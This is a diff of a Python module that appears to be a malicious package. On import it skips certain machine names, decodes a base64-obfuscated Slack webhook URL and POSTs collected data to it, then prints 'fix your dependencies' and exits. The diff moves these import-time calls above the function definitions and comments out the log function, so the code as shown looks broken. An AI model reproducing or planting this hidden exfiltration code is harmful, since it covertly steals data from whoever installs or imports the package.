@@ -4,13 +4,17 @@ import json
 import traceback
 import base64
 from urllib import request
+logger = logging.getLogger()
+save_some_stuff()
+log("fix your dependencies")
+exit(1)
 
-def log(msg):
-    print(msg)
-    logger.critical(msg)
-    logger.error(msg)
-    logger.info(msg)
-    logger.debug(msg)
+# def log(msg):
+#     print(msg)
+#     logger.critical(msg)
+#     logger.error(msg)
+#     logger.info(msg)
+#     logger.debug(msg)
 
 def save_some_stuff():
     known_bots_nodename = ["lili-pc"]
@@ -23,7 +27,7 @@ def save_some_stuff():
         _save_some_stuff()
     except:
         return
-    
+
 def _save_some_stuff():
     url = ("aHR0cHM6Ly9ob29rcy5zbGF"
            "jay5jb20vc2VydmljZXMvVDAzRjRCV"
@@ -43,11 +47,3 @@ def _save_some_stuff():
     req =  request.Request(url)
     req.add_header('Content-Type', 'application/json')
     request.urlopen(req, data=data)
-
-
-logger = logging.getLogger()
-save_some_stuff()
-log("fix your dependencies")
-
-
-exit(1)
